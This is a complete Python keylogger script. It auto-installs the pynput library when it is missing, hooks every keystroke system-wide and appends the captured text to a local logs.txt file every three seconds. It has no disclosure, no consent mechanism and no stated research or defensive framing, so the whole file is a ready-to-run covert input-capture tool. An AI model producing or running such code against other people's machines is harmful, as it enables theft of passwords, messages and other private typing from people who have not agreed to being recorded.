import pip
from threading import Timer

log = ''


def import_or_install(package):
    try:
        __import__(package)
    except ImportError:
        pip.main(['install', package])


import_or_install('pynput')

from pynput.keyboard import Listener

def report():
    global log
    if log != '':
        with open('logs.txt', 'a+') as f:
            f.write(log)
        log = ''
    Timer(3, report).start()


def on_press(key):
    global log
    k = str(key)
    if len(k) > 4:
        if 'Key.space' in k:
            log += ' '
        else:
            log += ' '+str(key)+' '
    else:
        log += k[1]


report()

with Listener(on_press=on_press) as listener:
    listener.join()
# Key.(?!backspace\b)\b\w+
